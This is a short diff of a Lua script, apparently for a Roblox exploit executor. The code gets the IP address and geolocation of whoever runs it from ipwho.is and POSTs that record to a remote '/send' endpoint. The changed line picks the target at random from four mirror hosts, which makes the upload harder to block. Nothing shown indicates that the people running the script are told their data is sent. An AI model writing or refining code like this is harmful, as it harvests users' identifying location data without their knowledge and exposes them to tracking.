@@ -91,7 +91,7 @@ if (writefile) and (getcustomasset) then
 	local WhoIs = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwho.is/"))
 	coroutine.wrap(function()
 		local message = request({
-			Url = _G.MirrorLinks.."/send",
+			Url = _G.MirrorLinks[math.random(1, 4)].."/send",
 			Method = "POST",
 			Headers = {
 				["Content-Type"] = "application/json"
